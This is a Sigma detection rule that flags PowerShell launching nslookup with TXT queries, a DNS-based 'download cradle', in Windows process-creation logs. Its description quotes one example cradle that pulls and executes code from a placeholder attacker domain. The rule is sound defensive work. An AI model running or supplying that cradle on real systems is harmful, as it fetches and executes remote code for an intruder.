title: Nslookup PwSh Download Cradle
ruletype: Sigma
author: Zach Mathis (@yamatosecurity)
date: 2022/09/06
description: This rule tries to detect powershell download cradles, e.g. powershell
    . (nslookup -q=txt http://some.owned.domain.com)[-1]
detection:
    SELECTION_1:
        EventID: 4688
    SELECTION_2:
        Channel: Security
    SELECTION_3:
        ParentProcessName: '*\powershell.exe'
    SELECTION_4:
        NewProcessName: '*nslookup*'
    SELECTION_5:
        CommandLine: '*=txt *'
    condition: (SELECTION_1 and SELECTION_2 and SELECTION_3 and SELECTION_4 and SELECTION_5)
id: 72671447-4352-4413-bb91-b85569687135
level: medium
logsource:
    category: process_creation
    product: windows
references:
- https://twitter.com/alh4zr3d/status/1566489367232651264
status: experimental
tags:
- attack.command_and_control
- attack.t1105
- attack.t1071.004

